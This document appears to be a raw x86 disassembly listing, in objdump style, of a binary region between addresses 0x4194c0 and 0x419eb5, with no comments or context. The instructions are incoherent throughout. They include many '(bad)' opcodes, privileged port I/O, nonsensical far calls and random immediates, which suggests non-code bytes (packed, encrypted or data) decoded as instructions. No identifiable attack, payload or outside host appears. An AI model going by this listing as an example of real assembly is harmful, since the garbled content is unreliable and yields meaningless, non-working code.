  4194c0:	popf   
  4194c1:	enter  0x5bec,0xb6
  4194c5:	adc    al,BYTE PTR [ecx]
  4194c7:	add    dh,dh
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [esi],bl
  4194cd:	mov    DWORD PTR [eax+0x52],eax
  4194d0:	pusha  
  4194d1:	(bad)  
  4194d3:	jmp    0xc15ca4d7
  4194d8:	stc    
  4194d9:	xor    cl,ch
  4194db:	dec    ebp
  4194dc:	ror    DWORD PTR [ecx],cl
  4194de:	arpl   WORD PTR [eax-0x22],bx
  4194e1:	ja     0x419552
  4194e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e4:	cmp    ah,0x54
  4194e7:	xor    BYTE PTR [edx-0x56fa9169],cl
  4194ed:	xor    ah,BYTE PTR [ebx+0x507f6b4f]
  4194f3:	pusha  
  4194f4:	paddusb mm7,QWORD PTR [ecx]
  4194f7:	fwait
  4194f8:	pop    edx
  4194f9:	jae    0x41948c
  4194fb:	and    eax,0x858a7de2
  419500:	pop    edx
  419501:	stos   DWORD PTR es:[edi],eax
  419502:	and    eax,0x292adda
  419507:	arpl   sp,ax
  419509:	out    0xe,eax
  41950b:	push   ecx
  41950c:	jne    0x419499
  41950e:	mov    esp,0x45bb7ed0
  419513:	das    
  419514:	mov    ds:0x3de5e366,eax
  419519:	sahf   
  41951a:	pop    ds
  41951b:	sub    BYTE PTR [eax-0x7a],ah
  41951e:	out    dx,eax
  41951f:	repnz mov ds:0xde58a2df,al
  419525:	cmp    al,0x0
  419527:	sub    al,0x3f
  419529:	stos   DWORD PTR es:[edi],eax
  41952a:	popa   
  41952b:	lods   al,BYTE PTR ds:[esi]
  41952c:	sbb    edx,ebx
  41952e:	sbb    edi,DWORD PTR [eax+0x4d]
  419531:	stos   DWORD PTR es:[edi],eax
  419532:	add    dh,dl
  419534:	or     al,0x6a
  419536:	xor    ecx,DWORD PTR [edi]
  419538:	and    eax,0xbc1ba28a
  41953d:	and    di,sp
  419540:	push   edi
  419541:	ficomp WORD PTR [eax-0x6e]
  419544:	pop    esi
  419545:	push   0x7ae9614e
  41954a:	adc    dh,BYTE PTR [eax-0xa]
  41954d:	and    ah,BYTE PTR ds:0xb18abf9b
  419553:	jns    0x419509
  419555:	sbb    al,0x94
  419557:	push   0xffffff9a
  419559:	jb     0x4194ed
  41955b:	fwait
  41955c:	sub    DWORD PTR [esi],ecx
  41955e:	fisttp QWORD PTR [ebx-0x18]
  419561:	retf   
  419562:	add    dh,BYTE PTR ds:0xdef4234c
  419568:	xchg   esi,eax
  419569:	into   
  41956a:	in     al,dx
  41956b:	stos   DWORD PTR es:[edi],eax
  41956c:	mov    ch,0x4b
  41956e:	outs   dx,BYTE PTR ds:[esi]
  41956f:	sbb    esi,DWORD PTR [edi+edi*4+0x22]
  419573:	xchg   BYTE PTR [ecx],cl
  419575:	loop   0x4195da
  419577:	in     eax,dx
  419578:	cs pop ds
  41957a:	stc    
  41957b:	xor    eax,0x4652b154
  419580:	inc    ebp
  419581:	icebp  
  419582:	and    DWORD PTR [edi-0x5ae90532],ecx
  419588:	add    ecx,DWORD PTR [edi+0x2e]
  41958b:	dec    edi
  41958c:	fs mov dl,0x3e
  41958f:	fimul  WORD PTR [ecx]
  419591:	add    dh,dl
  419593:	pop    edi
  419594:	scas   al,BYTE PTR es:[edi]
  419595:	das    
  419596:	jp     0x419519
  419598:	loopne 0x41952e
  41959a:	mov    ebp,0x2c93f147
  41959f:	jmp    0x4195c6
  4195a1:	cwde   
  4195a2:	push   es
  4195a3:	popf   
  4195a4:	push   esi
  4195a5:	out    dx,al
  4195a6:	je     0x419597
  4195a8:	xor    DWORD PTR [edx],ebp
  4195aa:	jne    0x4195e3
  4195ac:	xchg   ebp,eax
  4195ad:	xlat   BYTE PTR ds:[ebx]
  4195ae:	jne    0x419598
  4195b0:	(bad)
  4195b3:	int3   
  4195b4:	mov    esp,DWORD PTR [ebx+0x61]
  4195b7:	mov    ah,0x1c
  4195b9:	je     0x419578
  4195bb:	mov    edi,0xcfd040fa
  4195c0:	pop    edx
  4195c1:	cmp    eax,0x0
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax-0x69f87e9c]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    ah,al
  41964d:	mov    edx,0x8ad359
  419652:	dec    edi
  419653:	sar    DWORD PTR [ebx+eax*2+0x67742163],1
  41965a:	adc    eax,0x5087e68a
  41965f:	xchg   DWORD PTR [esi+0x18f5722e],eax
  419665:	test   DWORD PTR [esi],edi
  419667:	jae    0x4196df
  419669:	stos   DWORD PTR es:[edi],eax
  41966a:	(bad)  
  41966b:	call   0x7a58a14c
  419670:	iret   
  419671:	test   eax,0x3cef6312
  419676:	out    0xa6,eax
  419678:	in     al,0xff
  41967a:	data16 jae 0x4196bd
  41967d:	scas   eax,DWORD PTR es:[edi]
  41967e:	push   ds
  41967f:	fcmovnb st,st(1)
  419681:	lahf   
  419682:	mov    dh,0x5c
  419684:	rcr    BYTE PTR [ecx-0x4],0x38
  419688:	leave  
  419689:	ss aas 
  41968b:	sbb    ecx,DWORD PTR [ecx]
  41968d:	mov    DWORD PTR [ebx+0x2c],edi
  419690:	pushf  
  419691:	pushf  
  419692:	cmc    
  419693:	leave  
  419694:	mov    WORD PTR [ebx-0x6a],fs
  419697:	clc    
  419698:	aaa    
  419699:	out    0xad,eax
  41969b:	fidivr DWORD PTR [eax+0x2563b9b9]
  4196a1:	pop    ecx
  4196a2:	xchg   edx,eax
  4196a3:	(bad)  
  4196a4:	pop    ebx
  4196a5:	sub    eax,0xa72e22b0
  4196aa:	jp     0x4196ae
  4196ac:	cmp    esp,esp
  4196ae:	fmulp  st(0),st
  4196b0:	fwait
  4196b1:	jb     0x4196a2
  4196b3:	sti    
  4196b4:	sub    cl,ah
  4196b6:	arpl   cx,bp
  4196b8:	xacquire xchg DWORD PTR [ecx+0x4e],eax
  4196bc:	or     eax,0x46066d3e
  4196c1:	mov    ecx,es
  4196c3:	cs sub eax,0xefb55dc7
  4196c9:	and    BYTE PTR [ecx+eiz*2],dh
  4196cc:	mov    ebx,0x720ce12b
  4196d1:	adc    DWORD PTR [ebx+0x33],edx
  4196d4:	mov    eax,ds:0xb3d56b7d
  4196d9:	mov    edx,0x30fbed28
  4196de:	lods   al,BYTE PTR ds:[esi]
  4196df:	lods   eax,DWORD PTR ds:[esi]
  4196e0:	outs   dx,BYTE PTR ds:[esi]
  4196e1:	mov    edx,0xaff232e6
  4196e6:	mov    WORD PTR [eax+0x1b],fs
  4196e9:	or     DWORD PTR [edi+0x7a32b1e7],edi
  4196ef:	mov    esi,0x5ed0c3d8
  4196f4:	push   ds
  4196f5:	ins    BYTE PTR es:[edi],dx
  4196f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f7:	cmp    ebx,DWORD PTR [ecx-0x34d00e73]
  4196fd:	adc    DWORD PTR [esi+0x37018eb9],ecx
  419703:	fldcw  WORD PTR fs:0x44d44f48
  41970a:	xchg   DWORD PTR [eax+0x2e],ebx
  41970d:	jecxz  0x41972a
  41970f:	pop    ebp
  419710:	in     al,dx
  419711:	je     0x4196c9
  419713:	gs adc eax,0xff446a99
  419719:	cmp    ebp,esi
  41971b:	lods   al,BYTE PTR ds:[esi]
  41971c:	jg     0x4196f4
  41971e:	sahf   
  41971f:	scas   al,BYTE PTR es:[edi]
  419720:	cwde   
  419721:	ffreep st(6)
  419723:	xchg   ebx,eax
  419724:	mov    bl,0x34
  419726:	push   ecx
  419727:	inc    edx
  419728:	xchg   ebx,eax
  419729:	inc    edx
  41972a:	and    eax,0xde67ff92
  41972f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419730:	shr    DWORD PTR [esi*2+0x2ef3cb8b],cl
  419737:	rol    BYTE PTR [ebp-0x30],cl
  41973a:	pop    eax
  41973b:	iretw  
  41973d:	add    BYTE PTR [ebp+0x680651],dl
	...
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx-0x3ed83417]
  4197c1:	xor    al,0x7a
  4197c3:	data16 mov ds:0xf6000114,al
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [edi*2+0x45e1ed5d],al
  4197d2:	test   al,0x1c
  4197d4:	pop    ds
  4197d5:	push   ecx
  4197d6:	pop    ss
  4197d7:	outs   dx,DWORD PTR ds:[esi]
  4197d8:	jmp    0x419858
  4197da:	xchg   DWORD PTR [esi-0x6],ebp
  4197dd:	das    
  4197de:	lods   eax,DWORD PTR ds:[esi]
  4197df:	aaa    
  4197e0:	push   ds
  4197e1:	ins    BYTE PTR es:[edi],dx
  4197e2:	retf   0x5907
  4197e5:	or     DWORD PTR [edx-0x313ee4e6],esi
  4197eb:	mov    cl,0x69
  4197ed:	iret   
  4197ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ef:	xchg   esi,eax
  4197f0:	inc    ebp
  4197f1:	mov    ds:0xe7dbbe0f,al
  4197f6:	jecxz  0x4197f6
  4197f8:	pop    ebx
  4197f9:	(bad)  
  4197fa:	adc    DWORD PTR [edi+0x3b],edx
  4197fd:	ret    0x1913
  419800:	scas   eax,DWORD PTR es:[edi]
  419801:	pusha  
  419802:	fld    DWORD PTR [esi-0x41ba1987]
  419808:	mov    dl,0xcf
  41980a:	stos   DWORD PTR es:[edi],eax
  41980b:	inc    ebx
  41980c:	test   DWORD PTR ds:0xfd827082,esi
  419812:	jl     0x419870
  419814:	or     BYTE PTR [edi+ecx*4+0x1f],bh
  419818:	es dec eax
  41981a:	xlat   BYTE PTR ds:[ebx]
  41981b:	out    dx,eax
  41981c:	add    bh,BYTE PTR [ebx]
  41981e:	mov    ch,0xd8
  419820:	int3   
  419821:	scas   eax,DWORD PTR es:[edi]
  419822:	dec    eax
  419823:	mov    esi,0x27ce0fc1
  419828:	jl     0x4197b4
  41982a:	inc    ecx
  41982b:	jb     0x419852
  41982d:	imul   eax
  41982f:	xor    DWORD PTR [edi-0x22],eax
  419832:	xchg   BYTE PTR [edi-0xe],dh
  419835:	jmp    0x419877
  419837:	fisttp WORD PTR [edi+0x2f]
  41983a:	in     eax,0xce
  41983c:	or     DWORD PTR [edx-0x10],0xffffff92
  419840:	mov    edi,0xb1c749c8
  419845:	jmp    0x4198a9
  419847:	inc    ecx
  419849:	(bad)  
  41984a:	std    
  41984b:	xchg   ebx,eax
  41984c:	(bad)  
  41984d:	popf   
  41984e:	outs   dx,BYTE PTR ds:[esi]
  41984f:	push   esi
  419850:	push   edi
  419851:	lds    edi,FWORD PTR ds:0x430f7aa1
  419857:	arpl   bp,dx
  419859:	or     BYTE PTR [esi-0x575019b3],0x94
  419860:	repnz xchg ecx,eax
  419862:	daa    
  419863:	pushf  
  419864:	das    
  419865:	(bad)  
  419866:	rcr    DWORD PTR [ebx-0x7f],1
  419869:	cld    
  41986a:	ins    BYTE PTR es:[edi],dx
  41986b:	mov    dh,0x1b
  41986d:	mov    ebp,0x936f50d8
  419872:	push   ebp
  419873:	mov    esi,0xabf3ffb0
  419878:	jae    0x419818
  41987a:	dec    ebp
  41987b:	sbb    ch,BYTE PTR [esi-0x67]
  41987e:	mov    ebx,0x123cfc27
  419883:	adc    eax,0x3f23efeb
  419888:	aam    0xda
  41988a:	fisttp DWORD PTR fs:[esi+0x2d]
  41988e:	push   esi
  41988f:	cmp    ch,BYTE PTR [ecx+0x52]
  419892:	mov    edi,0x3a0af4de
  419897:	cmc    
  419898:	test   esi,ecx
  41989a:	fst    QWORD PTR [eax+0x9272b58]
  4198a0:	dec    ecx
  4198a1:	stos   DWORD PTR es:[edi],eax
  4198a2:	ds adc ah,dl
  4198a5:	je     0x419881
  4198a7:	retf   0x7d29
  4198aa:	call   0xfdea14b
  4198af:	xor    ah,ch
  4198b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198b2:	push   edx
  4198b3:	jg     0x4198fe
  4198b5:	lock sub eax,0x204faed4
  4198bb:	pop    ds
  4198bc:	cli    
  4198bd:	push   ss
  4198be:	jnp    0x41984a
  4198c0:	adc    al,0x13
	...
  419932:	add    BYTE PTR [eax],al
  419934:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	xchg   DWORD PTR [ebp+0x15989223],esi
  419946:	add    DWORD PTR [eax],eax
  419948:	test   BYTE PTR [eax],0x0
  41994b:	add    BYTE PTR [edi-0x2c],cl
  41994e:	out    0xa2,al
  419950:	fistp  WORD PTR ds:0xd9c5d07f
  419956:	sti    
  419957:	aaa    
  419958:	add    dl,BYTE PTR [ecx-0x3b]
  41995b:	mov    cl,0x8b
  41995d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41995e:	popa   
  41995f:	xchg   al,al
  419961:	pushf  
  419962:	fadd   DWORD PTR [ebx+ebp*8-0x5bbadaa8]
  419969:	push   ebx
  41996a:	jle    0x41991d
  41996c:	cdq    
  41996d:	stos   DWORD PTR es:[edi],eax
  41996e:	jge    0x419984
  419970:	jecxz  0x41995d
  419972:	retf   
  419973:	dec    ecx
  419974:	and    BYTE PTR [eax+0x15],dl
  419977:	pop    esi
  419978:	dec    esi
  419979:	cs jbe 0x41999e
  41997c:	test   BYTE PTR [ebx-0x7d],ah
  41997f:	mov    dh,0x22
  419981:	pmullw mm4,QWORD PTR ds:0xdeb7d241
  419988:	push   eax
  419989:	fdivr  QWORD PTR [eax*8+0x4418c18d]
  419990:	or     bh,BYTE PTR [ecx+0x3d]
  419993:	or     BYTE PTR [edi+0x538b42a5],bl
  419999:	(bad)  
  41999a:	data16 rcl BYTE PTR [ecx+ebp*2-0x50845ea9],1
  4199a2:	xlat   BYTE PTR ds:[ebx]
  4199a3:	mov    esp,edi
  4199a5:	into   
  4199a6:	xchg   ebp,eax
  4199a7:	cs mov bh,0xcb
  4199aa:	push   ecx
  4199ab:	loope  0x419985
  4199ad:	or     eax,0x956cea12
  4199b2:	mov    ebx,0xf1192dd2
  4199b7:	and    eax,0x3c84b06a
  4199bc:	adc    BYTE PTR [edi-0x5f],al
  4199bf:	loope  0x4199df
  4199c1:	mov    gs,WORD PTR [edx]
  4199c3:	stos   DWORD PTR es:[edi],eax
  4199c4:	dec    edx
  4199c5:	pop    esp
  4199c6:	mov    bh,0x48
  4199c8:	(bad)  
  4199c9:	adc    dl,BYTE PTR [edx]
  4199cb:	cli    
  4199cc:	cmp    BYTE PTR [ebx+0x47],bl
  4199cf:	cdq    
  4199d0:	xor    al,BYTE PTR [esi-0x7cd57222]
  4199d6:	add    al,0xc6
  4199d8:	pop    edx
  4199d9:	bound  ebp,QWORD PTR [edx]
  4199db:	fnstcw WORD PTR ds:0x8874941a
  4199e1:	hlt    
  4199e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199e3:	xchg   ecx,eax
  4199e4:	cmp    edx,0xffffffee
  4199e7:	aam    0xe1
  4199e9:	add    eax,0x8e0803d4
  4199ee:	in     eax,dx
  4199ef:	std    
  4199f0:	mov    edi,0xd84b19b
  4199f5:	inc    eax
  4199f6:	xor    edx,esp
  4199f8:	bound  edi,QWORD PTR [edi-0x178af6ac]
  4199fe:	lock sub al,0xaf
  419a01:	shr    DWORD PTR [esi],cl
  419a03:	sub    al,0xa8
  419a05:	and    DWORD PTR [ecx],ebx
  419a07:	scas   eax,DWORD PTR es:[edi]
  419a08:	sbb    ch,0xbb
  419a0b:	ss icebp 
  419a0d:	scas   eax,DWORD PTR es:[edi]
  419a0e:	mov    edi,0x4cd0652c
  419a13:	inc    ecx
  419a14:	add    eax,0xb38aa50
  419a19:	mov    eax,ds:0x3153d132
  419a1e:	stc    
  419a1f:	lock dec eax
  419a21:	(bad)  
  419a22:	xchg   esi,eax
  419a23:	inc    ebx
  419a24:	icebp  
  419a25:	fbstp  TBYTE PTR [ecx-0x66]
  419a28:	xchg   edx,eax
  419a29:	test   BYTE PTR [edi-0x80],ah
  419a2c:	jecxz  0x419a9a
  419a2e:	inc    eax
  419a2f:	jge    0x419a71
  419a31:	dec    edi
  419a32:	in     al,0x8b
  419a34:	cld    
  419a35:	mov    ebx,0xbf33d09d
  419a3a:	jecxz  0x419a57
  419a3c:	sar    DWORD PTR [edx],0xf6
  419a3f:	jbe    0x419a65
  419a41:	loop   0x419a43
	...
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x14357b47
  419ac1:	loope  0x419b03
  419ac3:	pop    es
  419ac4:	mov    ss,WORD PTR [esi]
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	test   BYTE PTR [eax],0x0
  419acb:	add    ah,al
  419acd:	bound  esi,QWORD PTR [ebp-0x57c18a10]
  419ad3:	sub    BYTE PTR [ebp+0x50],ch
  419ad6:	imul   ebx,DWORD PTR [ecx],0x8ae6ef0b
  419adc:	dec    edi
  419add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ade:	scas   al,BYTE PTR es:[edi]
  419adf:	jle    0x419a9f
  419ae1:	ss out 0xb7,al
  419ae4:	add    al,0xc2
  419ae6:	mov    dl,0xfe
  419ae8:	stos   DWORD PTR es:[edi],eax
  419ae9:	dec    ebx
  419aea:	xor    al,0xe8
  419aec:	sti    
  419aed:	(bad)  
  419aee:	jecxz  0x419b09
  419af0:	aam    0xfc
  419af2:	(bad)  
  419af3:	out    dx,eax
  419af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419af5:	or     BYTE PTR [ecx+eax*4],al
  419af8:	aaa    
  419af9:	push   ebp
  419afa:	push   0x6f9ed1a3
  419aff:	lea    ecx,[ebx]
  419b01:	imul   edx,esp,0xee0c25e8
  419b07:	lahf   
  419b08:	icebp  
  419b09:	lahf   
  419b0a:	mov    eax,0xb1de136e
  419b0f:	(bad)  
  419b10:	sahf   
  419b11:	inc    edx
  419b12:	jecxz  0x419b3b
  419b14:	imul   eax,DWORD PTR [ebp+0x495a685d],0xffffffee
  419b1b:	mov    esi,0xca21ab6a
  419b20:	add    BYTE PTR [ebx+0x4b1551ac],ah
  419b26:	sbb    BYTE PTR [edi+0x3d9e487d],ah
  419b2c:	cmc    
  419b2d:	dec    ecx
  419b2e:	inc    esp
  419b2f:	xor    DWORD PTR [ebp-0x5b6a9144],ecx
  419b35:	fnstcw WORD PTR [edx+eax*2-0x4617147a]
  419b3c:	jnp    0x419b2e
  419b3e:	dec    ebx
  419b3f:	lahf   
  419b40:	jg     0x419b92
  419b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b43:	mov    ch,0x25
  419b45:	dec    eax
  419b46:	mov    esi,0xe0c5af4e
  419b4b:	arpl   WORD PTR [edi+ebx*4+0x76],ax
  419b4f:	inc    esi
  419b50:	in     al,0x4e
  419b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b53:	pop    es
  419b54:	ret    
  419b55:	sub    BYTE PTR [ebp*8+0x32981793],ch
  419b5c:	or     bh,ch
  419b5e:	dec    ecx
  419b5f:	cs sbb eax,0x2a8e8050
  419b65:	or     eax,0x75e6959c
  419b6a:	ja     0x419be2
  419b6c:	ss stos BYTE PTR es:[edi],al
  419b6e:	mov    eax,ds:0x5d4d1ae3
  419b73:	lahf   
  419b74:	mov    BYTE PTR [edx-0x67],bh
  419b77:	add    eax,0x9ddd244
  419b7c:	mov    ds:0xd933c731,al
  419b81:	test   DWORD PTR [edx],edx
  419b83:	cmp    edi,DWORD PTR [edx+0x72]
  419b86:	test   al,0xd5
  419b88:	mov    eax,ds:0xc71a26f6
  419b8d:	jg     0x419b58
  419b8f:	pushf  
  419b90:	mov    esp,0x939590c1
  419b95:	out    0xbe,eax
  419b97:	jno    0x419b5e
  419b99:	add    BYTE PTR [edx-0x14],al
  419b9c:	xor    eax,0xa5be5532
  419ba1:	inc    eax
  419ba2:	mov    ah,0xe4
  419ba4:	ffreep st(3)
  419ba6:	into   
  419ba7:	xor    eax,0x1f5ccd83
  419bac:	mov    al,0xd
  419bae:	gs loop 0x419b86
  419bb1:	outs   dx,BYTE PTR ds:[esi]
  419bb2:	lods   eax,DWORD PTR ds:[esi]
  419bb3:	xchg   DWORD PTR [esi-0x73dd0af0],ecx
  419bb9:	test   ah,ch
  419bbb:	fdivr  QWORD PTR [edi]
  419bbd:	add    al,0xff
  419bbf:	mov    al,fs:0xe7
	...
  419c31:	add    BYTE PTR [eax],al
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0x5b
  419c41:	inc    ecx
  419c42:	pusha  
  419c43:	daa    
  419c44:	test   BYTE PTR [edi],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	test   BYTE PTR [eax],0x0
  419c4b:	add    BYTE PTR [ebp+0x17a4f2ce],ah
  419c51:	mov    al,0x2f
  419c53:	xchg   esi,eax
  419c54:	jo     0x419c26
  419c56:	xor    ah,ah
  419c58:	inc    eax
  419c59:	mov    ebx,0x4a71e401
  419c5e:	push   0x19
  419c60:	shl    ch,0x43
  419c63:	jbe    0x419cb8
  419c65:	xor    al,0x8c
  419c67:	cmp    BYTE PTR fs:[ecx-0x5e],ch
  419c6b:	xchg   esp,eax
  419c6c:	call   DWORD PTR [edx-0xcb95bd2]
  419c72:	ret    0x66e6
  419c75:	mov    ch,0x5
  419c77:	into   
  419c78:	push   ebx
  419c79:	fs sti 
  419c7b:	pop    ds
  419c7c:	jns    0x419c01
  419c7e:	sar    DWORD PTR [edx-0x514cbf6f],cl
  419c84:	or     eax,0x36b65ba8
  419c89:	xlat   BYTE PTR ds:[ebx]
  419c8a:	inc    edx
  419c8b:	jns    0x419c9c
  419c8d:	daa    
  419c8e:	cmp    bl,dl
  419c90:	idiv   DWORD PTR [esi-0x41]
  419c93:	mov    edi,0xfc5bebe1
  419c98:	sahf   
  419c99:	popa   
  419c9a:	out    0xe6,eax
  419c9c:	nop
  419c9d:	repnz test al,0x44
  419ca0:	iret   
  419ca1:	mul    DWORD PTR ds:0xe9d54906
  419ca7:	jecxz  0x419c35
  419ca9:	scas   al,BYTE PTR es:[edi]
  419caa:	mov    esp,0xf18267cb
  419caf:	iret   
  419cb0:	std    
  419cb1:	jno    0x419cf3
  419cb3:	mov    esp,0xccf841d4
  419cb8:	retf   0x186c
  419cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cbc:	pop    es
  419cbd:	stc    
  419cbe:	test   DWORD PTR [eax-0x26],esp
  419cc1:	test   ecx,edx
  419cc3:	dec    ecx
  419cc4:	jo     0x419c60
  419cc6:	add    BYTE PTR [ebp-0x21],al
  419cc9:	mov    ds:0x7c45d85,eax
  419cce:	mov    edi,0x77668ce1
  419cd3:	inc    ebx
  419cd4:	in     eax,dx
  419cd5:	hlt    
  419cd6:	gs pop eax
  419cd8:	mov    cl,0xf2
  419cda:	push   0x4
  419cdc:	cmc    
  419cdd:	push   ds
  419cde:	pop    esp
  419cdf:	fwait
  419ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce1:	jge    0x419ca2
  419ce3:	jae    0x419ce0
  419ce5:	mov    esi,0x7429886f
  419cea:	pop    ss
  419ceb:	dec    edx
  419cec:	hlt    
  419ced:	sub    al,0xad
  419cef:	mov    ch,0x21
  419cf1:	jnp    0x419d17
  419cf3:	or     DWORD PTR [edi-0x69],0xffffffc9
  419cf7:	sbb    dh,BYTE PTR [ebx]
  419cf9:	fucomp st(1)
  419cfb:	jle    0x419c9a
  419cfd:	in     eax,0x4f
  419cff:	sti    
  419d00:	push   edx
  419d01:	push   edx
  419d02:	pop    es
  419d03:	dec    esi
  419d04:	(bad)  
  419d05:	das    
  419d06:	mov    WORD PTR [edx],cs
  419d08:	aaa    
  419d09:	std    
  419d0a:	inc    edi
  419d0b:	repnz push ecx
  419d0d:	loop   0x419d8d
  419d0f:	mov    dh,0x69
  419d11:	push   eax
  419d12:	cmc    
  419d13:	or     DWORD PTR gs:[eax-0x11e0feae],edx
  419d1a:	push   ecx
  419d1b:	lods   eax,DWORD PTR ds:[esi]
  419d1c:	call   0x6327:0xf19dcaf4
  419d23:	out    dx,al
  419d24:	fidivr WORD PTR [edx-0x80]
  419d27:	lods   eax,DWORD PTR ds:[esi]
  419d28:	lods   al,BYTE PTR ds:[esi]
  419d29:	sub    eax,0xbbd54c02
  419d2e:	inc    edi
  419d2f:	pushf  
  419d30:	or     esi,DWORD PTR ds:0xf7231348
  419d36:	push   esi
  419d37:	sub    edx,DWORD PTR [edx-0x22]
  419d3a:	mov    esi,0x4f6197f
  419d3f:	xlat   BYTE PTR ds:[ebx]
  419d40:	icebp  
  419d41:	pop    esi
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	mov    esi,0x7a5ddeef
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    dh,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    dl,ah
  419dcd:	fisub  WORD PTR [edx+0x51]
  419dd0:	fs dec edi
  419dd2:	leave  
  419dd3:	add    ah,BYTE PTR [edi+ebx*2]
  419dd6:	iret   
  419dd7:	(bad)  
  419dd8:	addr16 out 0x33,al
  419ddb:	and    cl,BYTE PTR [edi-0x405a5ac0]
  419de1:	aas    
  419de2:	push   ds
  419de3:	pushf  
  419de4:	dec    ebx
  419de5:	outs   dx,DWORD PTR ds:[esi]
  419de6:	fdivr  DWORD PTR [edi+eax*8-0x73]
  419dea:	xor    dx,WORD PTR [edx-0x400a6a64]
  419df1:	loop   0x419e27
  419df3:	sub    BYTE PTR [ebx+0x5d],bl
  419df6:	adc    dl,BYTE PTR [ebp+0x1f]
  419df9:	call   0x25fa4cd7
  419dfe:	shl    bl,cl
  419e00:	pop    esp
  419e01:	inc    ebp
  419e02:	sub    DWORD PTR [eax],0xd6f7673
  419e08:	mov    ebx,0x1579d191
  419e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e0e:	dec    esi
  419e0f:	pop    esi
  419e10:	sar    BYTE PTR [ecx],0x5c
  419e13:	fwait
  419e14:	mov    dh,BYTE PTR [edx+0x5e116ff3]
  419e1a:	inc    edi
  419e1b:	mov    dl,0xc2
  419e1d:	arpl   WORD PTR [eax-0x7e4c8aec],sp
  419e23:	jnp    0x419de5
  419e25:	xchg   sp,ax
  419e27:	mov    al,ds:0xb222c9a5
  419e2c:	imul   eax,DWORD PTR [ecx+0x3d],0xdc19241c
  419e33:	test   DWORD PTR [ebp+0x6f],0xda08f039
  419e3a:	gs sub eax,0x2e614000
  419e40:	les    ebx,FWORD PTR [ebx-0x36]
  419e43:	fwait
  419e44:	mov    DWORD PTR [edx+0x31],eax
  419e47:	cmp    bh,BYTE PTR [esi-0x24]
  419e4a:	sub    ch,al
  419e4c:	push   0xffffffb6
  419e4e:	pop    edx
  419e4f:	cmp    DWORD PTR [esi],edx
  419e51:	mov    bh,0x8a
  419e53:	inc    esp
  419e54:	int    0xc2
  419e56:	xchg   bh,ch
  419e58:	pop    ebp
  419e59:	popa   
  419e5a:	sbb    ebp,DWORD PTR [ebx]
  419e5c:	pop    ds
  419e5d:	push   cs
  419e5e:	inc    esp
  419e5f:	dec    ebp
  419e60:	sbb    DWORD PTR [ebx],0x44
  419e63:	jne    0x419e92
  419e65:	xchg   esi,eax
  419e66:	dec    ecx
  419e67:	jp     0x419eb1
  419e69:	cwde   
  419e6a:	push   ds
  419e6b:	iret   
  419e6c:	pop    ebx
  419e6d:	stc    
  419e6e:	dec    edx
  419e6f:	dec    esp
  419e70:	push   ebp
  419e71:	dec    edx
  419e72:	int3   
  419e73:	mov    cl,dl
  419e75:	cmc    
  419e76:	leave  
  419e77:	xchg   esp,eax
  419e78:	jno    0x419ea9
  419e7a:	js     0x419e20
  419e7c:	test   al,0x99
  419e7e:	xor    BYTE PTR [esi+eax*4],0x2e
  419e82:	and    al,0xf2
  419e84:	fisubr WORD PTR [ebx-0x1c]
  419e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e88:	sub    DWORD PTR [ecx],0x74
  419e8b:	jg     0x419e1c
  419e8d:	push   cs
  419e8e:	push   ds
  419e8f:	fstp   QWORD PTR [esi+0x67]
  419e92:	sbb    BYTE PTR [ebx+0x24],ah
  419e95:	pop    ebp
  419e96:	mov    edx,DWORD PTR [ebp-0x29]
  419e99:	stc    
  419e9a:	fucomip st,st(6)
  419e9c:	inc    ecx
  419e9d:	add    esp,0xffffff90
  419ea0:	or     ch,BYTE PTR [ecx-0x18]
  419ea3:	sub    al,BYTE PTR [ebx]
  419ea5:	popa   
  419ea6:	fsub   QWORD PTR [ebp-0x15]
  419ea9:	cmp    DWORD PTR [esi],ebp
  419eab:	lods   eax,DWORD PTR ds:[esi]
  419eac:	aas    
  419ead:	xor    bl,al
  419eaf:	int    0xe
  419eb1:	fadd   st(7),st
  419eb3:	jbe    0x419f06
  419eb5:	or     eax,0x95a26b6d
